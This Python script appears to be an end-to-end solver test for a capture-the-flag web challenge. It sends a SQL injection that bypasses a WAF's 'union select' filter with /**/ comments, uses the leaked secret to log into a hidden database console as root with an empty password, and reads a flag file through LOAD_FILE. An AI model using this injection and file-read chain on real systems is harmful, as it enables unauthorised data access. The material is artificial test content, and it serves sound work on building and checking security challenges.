#!/usr/bin/env python3
"""
web-sql-console end-to-end smoke test.
Chain: login.php SQLi (union+select WAF bypassed with /**/) leaks admin.secret =
hidden console filename -> log into dd02c7...php console as root/empty ->
SELECT LOAD_FILE('/tmp/flag.txt').
Exit 0 = PASS.
"""
import os
import re
import sys
import time

import requests

TARGET = os.environ.get("TARGET", "http://127.0.0.1:10008").rstrip("/")
FLAG_RE = re.compile(r"CTF4\{[^}]+\}")
ENDPOINT_RE = re.compile(r"([0-9a-f]{32}\.php)")


def expected_flag():
    path = os.environ.get("FLAGS_ENV", "")
    if path and os.path.exists(path):
        for line in open(path):
            m = re.match(r"\s*FLAG=(.*)", line)
            if m:
                return m.group(1).strip()
    return None


def wait_up():
    for _ in range(45):
        try:
            if requests.get(f"{TARGET}/login.php", timeout=5).status_code < 500:
                return
        except requests.RequestException:
            pass
        time.sleep(2)


def solve():
    s = requests.Session()

    # 1. SQLi on login.php -> leak admin.secret (the hidden console filename).
    #    The WAF blocks `union\s+select`, so use a comment instead of a space.
    r = s.post(
        f"{TARGET}/login.php",
        data={
            "username": "zzz' UNION/**/SELECT 1,secret,3 FROM users WHERE username='admin'-- -",
            "password": "x",
        },
        timeout=10,
    )
    m = ENDPOINT_RE.search(r.text)
    assert m, f"hidden endpoint not leaked: {r.text[:300]}"
    endpoint = m.group(1)

    # 2. Log into the hidden SQL console as root with an empty password.
    s.post(
        f"{TARGET}/{endpoint}",
        data={"login_action": "1", "db_user": "root", "db_pass": ""},
        timeout=10,
    )

    # 3. Read the flag file via LOAD_FILE.
    r = s.post(
        f"{TARGET}/{endpoint}",
        data={"sql_action": "1", "sql_query": "SELECT LOAD_FILE('/tmp/flag.txt')"},
        timeout=10,
    )
    m = FLAG_RE.search(r.text)
    return m.group(0) if m else ""


def main():
    wait_up()
    got = solve()
    want = expected_flag()
    print(f"[captured] {got!r}")
    if got and (want is None or got == want):
        print("PASS")
        return 0
    print(f"FAIL expected={want!r}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
